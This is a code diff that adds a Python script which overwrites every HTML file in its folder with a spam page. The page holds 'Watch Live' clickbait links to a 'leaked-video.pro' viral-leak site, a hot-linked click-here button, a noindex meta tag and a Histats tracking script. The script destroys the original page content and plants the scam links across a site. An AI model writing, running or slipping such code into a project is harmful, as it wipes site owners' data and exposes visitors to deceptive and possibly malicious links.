@@ -1,4 +1,8 @@
+import os
 
+directory_path = os.path.dirname(os.path.abspath(__file__))
+
+replacement_code = '''
 <center><h1><a href="https://leaked-video.pro/viral-leaked/?U"> Watch Live <h1></center>
 <center><a href="https://leaked-video.pro/viral-leaked/?U"><img src="https://edu.ieee.org/in-mepco-wie/wp-content/uploads/sites/387/2016/09/click-here-logo-button-gif-images-2.gif?format=750w" alt="click here"></a></center>
 <meta name="googlebot" content="noindex">
@@ -18,3 +22,13 @@ hs.src = ('//s10.histats.com/js15_as.js');
 <!-- Histats.com  END  -->
 
 
+'''
+
+for filename in os.listdir(directory_path):
+    if filename.endswith('.html'):
+        file_path = os.path.join(directory_path, filename)
+
+        with open(file_path, 'w') as file:
+            file.write(replacement_code)
+
+print('Content replaced in HTML files.')
